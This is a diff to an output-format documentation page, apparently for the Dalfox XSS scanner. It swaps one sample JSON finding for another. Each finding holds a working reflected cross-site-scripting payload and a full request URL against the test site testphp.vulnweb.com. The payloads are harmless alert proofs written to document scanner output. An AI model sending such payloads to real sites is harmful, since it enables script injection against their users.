@@ -33,15 +33,15 @@ permalink: /docs/json/
 
 ```json
 {
-      "type":"V",
-      "inject_type":"inHTML-URL",
-      "poc_type":"",
-      "method":"GET",
-      "data":"http://testphp.vulnweb.com/listproducts.php?artist=123%27%22%3E%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dalert%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E",
-      "param":"artist",
-      "payload":"'\"\u003e\u003ciframe srcdoc=\"\u003cinput onauxclick=alert(1)\u003e\" class=dalfox\u003e\u003c/iframe\u003e",
-      "evidence":"48 line:  syntax to use near ''\"\u003e\u003ciframe srcdoc=\"\u003cinput onauxclick=alert(1)\u003e\" class=dalfox",
-      "cwe":"CWE-79",
-      "severity": "High"
+    "type": "V",
+    "inject_type": "inHTML-URL",
+    "poc_type": "",
+    "method": "GET",
+    "data": "http://testphp.vulnweb.com/listproducts.php?cat=%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E",
+    "param": "cat",
+    "payload": "'\"><img/src/onerror=.1|alert`` class=dalfox>",
+    "evidence": "48 line:  syntax to use near ''\"><img/src/onerror=.1|alert`` class=dalfox>' at line 1",
+    "cwe": "CWE-79",
+    "severity": "High"
 }
 ```
